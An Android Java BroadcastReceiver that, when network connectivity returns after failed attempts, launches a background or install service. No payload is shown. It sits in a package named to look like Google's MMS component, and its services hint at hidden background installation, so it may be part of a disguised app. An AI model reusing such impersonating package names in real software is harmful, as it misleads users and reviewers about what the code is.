package com.google.android.mms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;

public class InternetStatusReceiver extends BroadcastReceiver {
    private static final String TAG = "InternetStatusReceiver";
    private static final boolean DEBUG = false;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        LOGD("receive the internet status changed");
        SettingManager sm = SettingManager.getInstance(context);
        sm.log("receive the internet status changed");
        ConnectivityManager connectivityManager = (ConnectivityManager) context
                                                        .getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = connectivityManager.getActiveNetworkInfo();
        LOGD("info = " + info + " info.isAvailable() = " + (info != null ? info.isAvailable() : false));
        sm.log("info = " + info + " info.isAvailable() = " + (info != null ? info.isAvailable() : false));
        if (info != null && info.isAvailable() == true
                && (sm.getInternetConnectFailed() == true
                        || sm.getInternetConnectFailedBeforeSMS() == true)) {
            LOGD("start servie for internet available");
            SettingManager.getInstance(context).log("find available internet");
            Intent intent1 = new Intent();
            intent1.setAction(BgService.ACTION_INTERNET_CHANGED);
            String str = intent.getStringExtra(SettingManager.CONNECT_NETWORK_REASON);
            if (str != null) {
                intent1.putExtra(SettingManager.CONNECT_NETWORK_REASON, str);
            }
            
            if (sm.getAppType().equals(SettingManager.APP_TYPE_INTERNAL)) {
                intent1.setClass(context, InstallService.class);
            } else {
                intent1.setClass(context, BgService.class);
            }
            context.startService(intent1);
        }
    }
    
    public final void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, "[[" + this.getClass().getSimpleName()
                    + "::" + Thread.currentThread().getStackTrace()[3].getMethodName()
                    + "]] " + msg);
        }
    }
}
